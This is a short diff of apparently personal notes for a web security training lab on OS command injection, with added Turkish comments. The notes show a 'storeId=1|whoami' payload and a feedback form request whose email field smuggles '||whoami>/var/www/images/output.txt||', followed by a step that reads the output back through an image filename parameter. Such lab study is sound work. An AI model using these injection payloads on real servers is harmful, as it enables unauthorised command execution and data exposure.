@@ -24,6 +24,7 @@ productId=4&storeId=1|whoami
 
 -- 
 
+- bir submit feedback gönder
 
 POST /feedback/submit HTTP/2
 Host: 0a0a009b03c7e17082b07f5100e80039.web-security-academy.net
@@ -71,6 +72,8 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=1, i
  
 csrf=hKhdqGFo5fbvVUk0DEP4VDGnUIHn9dLg&name=aa&email=||whoami>/var/www/images/output.txt||&subject=aa&message=aa
+
+bir foto yükleme istedği yakalayıp filename=output.txt yapıyoruz.
 
 
 --
